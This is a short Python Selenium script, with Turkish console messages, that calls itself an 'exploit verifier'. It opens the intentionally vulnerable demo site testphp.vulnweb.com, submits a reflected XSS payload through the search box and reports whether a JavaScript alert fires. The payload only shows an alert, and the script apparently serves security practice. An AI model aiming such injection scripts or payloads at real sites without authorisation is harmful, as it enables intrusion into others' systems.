from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def xss_verifier():
    print(f"{'='*60}")
    print("[*] EXPLOIT VERIFIER (OTOMATİK DOĞRULAYICI) BAŞLATILIYOR...")
    print(f"{'='*60}\n")

    options = webdriver.ChromeOptions()
    options.add_experimental_option("detach", True)
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        target_url = "http://testphp.vulnweb.com/search.php?test=query"
        print(f"[*] Siteye gidiliyor: {target_url}")
        driver.get(target_url)
        
        search_box = driver.find_element(By.NAME, "searchFor")
        payload = "<script>alert('Pwned_By_Selenium')</script>"
        
        print(f"[*] Payload enjekte ediliyor: {payload}")
        search_box.send_keys(payload)
        search_box.send_keys(Keys.RETURN)
        
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            print(f"\n[!!!] BAŞARILI! Tarayıcıda XSS tetiklendi!")
            print(f"      Mesaj: {alert.text}")
            time.sleep(2)
            alert.accept()
        except:
            print("[-] Alert çıkmadı. Başarısız.")
            
    except Exception as e:
        print(f"Hata: {e}")
    finally:
        time.sleep(3)
        driver.quit()

if __name__ == "__main__":
    xss_verifier()